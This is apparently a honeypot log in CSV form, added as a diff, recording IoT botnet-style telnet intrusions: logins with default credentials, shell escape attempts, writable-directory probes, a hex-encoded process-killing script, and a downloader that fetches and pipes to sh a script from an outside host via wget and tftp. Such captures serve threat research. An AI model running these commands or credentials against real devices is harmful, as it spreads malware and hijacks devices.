@@ -1,0 +1,136 @@
+timestamp,src_ip,event,username,password,command,session
+2026-11-09T14:52:21Z,167.250.28.185,login_success,telecomadmin,nE7jA%5m,,5dd222150ccb
+2026-11-09T14:52:23Z,167.250.28.185,command,,,enable,5dd222150ccb
+2026-11-09T14:52:23Z,167.250.28.185,command,,,enable,5dd222150ccb
+2026-11-09T14:52:23Z,167.250.28.185,command,,,system,5dd222150ccb
+2026-11-09T14:52:23Z,167.250.28.185,command,,,system,5dd222150ccb
+2026-11-09T14:52:23Z,167.250.28.185,command,,,shell,5dd222150ccb
+2026-11-09T14:52:23Z,167.250.28.185,command,,,shell,5dd222150ccb
+2026-11-09T14:52:23Z,167.250.28.185,command,,,sh,5dd222150ccb
+2026-11-09T14:52:23Z,167.250.28.185,command,,,linuxshell,5dd222150ccb
+2026-11-09T14:52:23Z,167.250.28.185,command,,,linuxshell,5dd222150ccb
+2026-11-09T14:52:23Z,167.250.28.185,command,,,ping ;sh,5dd222150ccb
+2026-11-09T14:52:24Z,167.250.28.185,command,,,/bin/busybox,5dd222150ccb
+2026-11-09T14:52:27Z,167.250.28.185,command,,,/bin/busybox hostname PBOC,5dd222150ccb
+2026-11-09T14:52:27Z,167.250.28.185,command,,,/bin/busybox echo > /tmp/.b && sh /tmp/.b && cd /tmp/,5dd222150ccb
+2026-11-09T14:52:27Z,167.250.28.185,command,,,/bin/busybox echo > /var/.b && sh /var/.b && cd /var/,5dd222150ccb
+2026-11-09T14:52:27Z,167.250.28.185,command,,,/bin/busybox echo > /var/run/.b && sh /var/run/.b && cd /var/run/,5dd222150ccb
+2026-11-09T14:52:27Z,167.250.28.185,command,,,/bin/busybox echo > /var/tmp/.b && sh /var/tmp/.b && cd /var/tmp/,5dd222150ccb
+2026-11-09T14:52:27Z,167.250.28.185,command,,,/bin/busybox echo > /dev/.b && sh /dev/.b && cd /dev/,5dd222150ccb
+2026-11-09T14:52:27Z,167.250.28.185,command,,,/bin/busybox echo > /dev/shm/.b && sh /dev/shm/.b && cd /dev/shm/,5dd222150ccb
+2026-11-09T14:52:27Z,167.250.28.185,command,,,/bin/busybox echo > /etc/.b && sh /etc/.b && cd /etc/,5dd222150ccb
+2026-11-09T14:52:28Z,167.250.28.185,command,,,/bin/busybox echo > /mnt/.b && sh /mnt/.b && cd /mnt/,5dd222150ccb
+2026-11-09T14:52:28Z,167.250.28.185,command,,,/bin/busybox echo > /usr/.b && sh /usr/.b && cd /usr/,5dd222150ccb
+2026-11-09T14:52:28Z,167.250.28.185,command,,,/bin/busybox echo > /boot/.b && sh /boot/.b && cd /boot/,5dd222150ccb
+2026-11-09T14:52:28Z,167.250.28.185,command,,,/bin/busybox echo > /home/.b && sh /home/.b && cd /home/,5dd222150ccb
+2026-11-09T14:52:28Z,167.250.28.185,command,,,/bin/busybox,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,"/bin/busybox echo -ne ""\x23\x21\x2F\x62\x69\x6E\x2F\x73\x68\x0A\x0A\x66\x6F\x72\x20\x70\x72\x6F\x63\x5F\x64\x69\x72\x20\x69\x6E\x20\x2F\x70\x72\x6F\x63"" > .k",5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,"/bin/busybox echo -ne ""\x2F\x2A\x3B\x20\x64\x6F\x0A\x20\x20\x20\x20\x70\x69\x64\x3D\x24\x7B\x70\x72\x6F\x63\x5F\x64\x69\x72\x23\x23\x2A\x2F\x7D\x0A\x0A"" >> .k",5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,"/bin/busybox echo -ne ""\x20\x20\x20\x20\x72\x65\x73\x75\x6C\x74\x3D\x24\x28\x6C\x73\x20\x2D\x6C\x20\x22\x2F\x70\x72\x6F\x63\x2F\x24\x70\x69\x64\x2F\x65"" >> .k",5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,"/bin/busybox echo -ne ""\x78\x65\x22\x20\x32\x3E\x20\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x29\x0A\x0A\x20\x20\x20\x20\x69\x66\x20\x5B\x20\x22\x24\x72\x65"" >> .k",5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,"/bin/busybox echo -ne ""\x73\x75\x6C\x74\x22\x20\x3D\x3D\x20\x22\x2F\x70\x72\x6F\x63\x2F\x24\x70\x69\x64\x2F\x65\x78\x65\x22\x20\x5D\x0A\x20\x20\x20\x20\ >> .k",5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,"/bin/busybox echo -ne ""\x20\x66\x69\x0A\x64\x6F\x6E\x65\x0A""ar >> .k",5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,sh .k,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,sh .k,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,sh .k,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,sh .k,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,sh .k,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,sh .k,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,sh .k,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,sh .k,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,sh .k,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,sh .k,5dd222150ccb
+2026-11-09T14:52:29Z,167.250.28.185,command,,,/bin/busybox,5dd222150ccb
+2026-11-09T15:38:25Z,41.39.79.223,login_success,root,admin,,3bf1fde88d77
+2026-11-09T15:38:25Z,41.39.79.223,command,,,enable,3bf1fde88d77
+2026-11-09T15:38:25Z,41.39.79.223,command,,,enable,3bf1fde88d77
+2026-11-09T15:38:25Z,41.39.79.223,command,,,system,3bf1fde88d77
+2026-11-09T15:38:25Z,41.39.79.223,command,,,system,3bf1fde88d77
+2026-11-09T15:38:26Z,41.39.79.223,command,,,shell,3bf1fde88d77
+2026-11-09T15:38:26Z,41.39.79.223,command,,,shell,3bf1fde88d77
+2026-11-09T15:38:26Z,41.39.79.223,command,,,sh,3bf1fde88d77
+2026-11-09T15:38:26Z,41.39.79.223,command,,,/bin/busybox V3G4,3bf1fde88d77
+2026-11-09T16:13:48Z,31.171.66.62,login_success,root,Zxic521,,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,enable,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,enable,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,system,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,system,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,shell,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,shell,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,sh,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,linuxshell,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,linuxshell,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,ping ;sh,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,/bin/busybox hostname PBOC,969f056e8ec6
+2026-11-09T16:13:48Z,31.171.66.62,command,,,/bin/busybox echo > /tmp/.b && sh /tmp/.b && cd /tmp/,969f056e8ec6
+2026-11-09T16:13:49Z,31.171.66.62,command,,,/bin/busybox echo > /var/.b && sh /var/.b && cd /var/,969f056e8ec6
+2026-11-09T16:13:49Z,31.171.66.62,command,,,/bin/busybox echo > /var/run/.b && sh /var/run/.b && cd /var/run/,969f056e8ec6
+2026-11-09T16:13:49Z,31.171.66.62,command,,,/bin/busybox echo > /var/tmp/.b && sh /var/tmp/.b && cd /var/tmp/,969f056e8ec6
+2026-11-09T16:13:49Z,31.171.66.62,command,,,/bin/busybox echo > /dev/.b && sh /dev/.b && cd /dev/,969f056e8ec6
+2026-11-09T16:13:49Z,31.171.66.62,command,,,/bin/busybox echo > /dev/shm/.b && sh /dev/shm/.b && cd /dev/shm/,969f056e8ec6
+2026-11-09T16:13:49Z,31.171.66.62,command,,,/bin/busybox echo > /etc/.b && sh /etc/.b && cd /etc/,969f056e8ec6
+2026-11-09T16:13:49Z,31.171.66.62,command,,,/bin/busybox echo > /mnt/.b && sh /mnt/.b && cd /mnt/,969f056e8ec6
+2026-11-09T16:13:49Z,31.171.66.62,command,,,/bin/busybox echo > /usr/.b && sh /usr/.b && cd /usr/,969f056e8ec6
+2026-11-09T16:13:49Z,31.171.66.62,command,,,/bin/busybox echo > /boot/.b && sh /boot/.b && cd /boot/,969f056e8ec6
+2026-11-09T16:13:49Z,31.171.66.62,command,,,/bin/busybox echo > /home/.b && sh /home/.b && cd /home/,969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"/bin/busybox echo -ne ""\x23\x21\x2F\x62\x69\x6E\x2F\x73\x68\x0A\x0A\x66\x6F\x72\x20\x70\x72\x6F\x63\x5F\x64\x69\x72\x20\x69\x6E\x20\x2F\x70\x72\x6F\x63"" > .k",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"/bin/busybox echo -ne ""\x2F\x2A\x3B\x20\x64\x6F\x0A\x20\x20\x20\x20\x70\x69\x64\x3D\x24\x7B\x70\x72\x6F\x63\x5F\x64\x69\x72\x23\x23\x2A\x2F\x7D\x0A\x0A"" >> .k",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"/bin/busybox echo -ne ""\x20\x20\x20\x20\x72\x65\x73\x75\x6C\x74\x3D\x24\x28\x6C\x73\x20\x2D\x6C\x20\x22\x2F\x70\x72\x6F\x63\x2F\x24\x70\x69\x64\x2F\x65"" >> .k",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"/bin/busybox echo -ne ""\x78\x65\x22\x20\x32\x3E\x20\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x29\x0A\x0A\x20\x20\x20\x20\x69\x66\x20\x5B\x20\x22\x24\x72\x65"" >> .k",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"/bin/busybox echo -ne ""\x73\x75\x6C\x74\x22\x20\x3D\x3D\x20\x22\x2F\x70\x72\x6F\x63\x2F\x24\x70\x69\x64\x2F\x65\x78\x65\x22\x20\x5D\x0A\x20\x20\x20\x20\x74\x68\x65\x6E\x0A\x20\x20\x20\x20\x20\x20\x20\",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"/bin/busybox echo -ne ""\x20\x66\x69\x0A\x64\x6F\x6E\x65\x0A"" >> .k",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,sh .k,969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l ""/proc/$pid/exe"" 2> /dev/null) if [ ""$result"" == ""/proc/$pid/exe"" ] then kill -9 ""$pid"" fi done",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,sh .k,969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l ""/proc/$pid/exe"" 2> /dev/null) if [ ""$result"" == ""/proc/$pid/exe"" ] then kill -9 ""$pid"" fi done",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,sh .k,969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l ""/proc/$pid/exe"" 2> /dev/null) if [ ""$result"" == ""/proc/$pid/exe"" ] then kill -9 ""$pid"" fi done",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,sh .k,969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l ""/proc/$pid/exe"" 2> /dev/null) if [ ""$result"" == ""/proc/$pid/exe"" ] then kill -9 ""$pid"" fi done",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,sh .k,969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l ""/proc/$pid/exe"" 2> /dev/null) if [ ""$result"" == ""/proc/$pid/exe"" ] then kill -9 ""$pid"" fi done",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,sh .k,969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l ""/proc/$pid/exe"" 2> /dev/null) if [ ""$result"" == ""/proc/$pid/exe"" ] then kill -9 ""$pid"" fi done",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,sh .k,969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l ""/proc/$pid/exe"" 2> /dev/null) if [ ""$result"" == ""/proc/$pid/exe"" ] then kill -9 ""$pid"" fi done",969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,sh .k,969f056e8ec6
+2026-11-09T16:13:50Z,31.171.66.62,command,,,"#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l ""/proc/$pid/exe"" 2> /dev/null) if [ ""$result"" == ""/proc/$pid/exe"" ] then kill -9 ""$pid"" fi done",969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,sh .k,969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,"#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l ""/proc/$pid/exe"" 2> /dev/null) if [ ""$result"" == ""/proc/$pid/exe"" ] then kill -9 ""$pid"" fi done",969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,sh .k,969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,"#!/bin/sh for proc_dir in /proc/*; do pid=${proc_dir##*/} result=$(ls -l ""/proc/$pid/exe"" 2> /dev/null) if [ ""$result"" == ""/proc/$pid/exe"" ] then kill -9 ""$pid"" fi done",969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,echo PBOCHK;command -v wget >/dev/null && /bin/busybox wget -qO- hxxp://45.90.163.37/wget.sh|sh;command -v tftp >/dev/null && /bin/busybox tftp -g -r tftp.sh -l- 45.90.163.37|sh;command -v ftpget >/de,969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,command -v wget,969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,command -v tftp,969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,command -v ftpget,969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,command -v curl,969f056e8ec6
+2026-11-09T16:13:51Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:13:56Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:13:56Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:01Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:01Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:07Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:07Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:12Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:12Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:17Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:17Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:22Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:22Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:27Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:28Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:33Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:33Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:38Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:38Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:43Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:43Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:48Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:48Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:54Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:54Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:59Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
+2026-11-09T16:14:59Z,31.171.66.62,command,,,/bin/busybox,969f056e8ec6
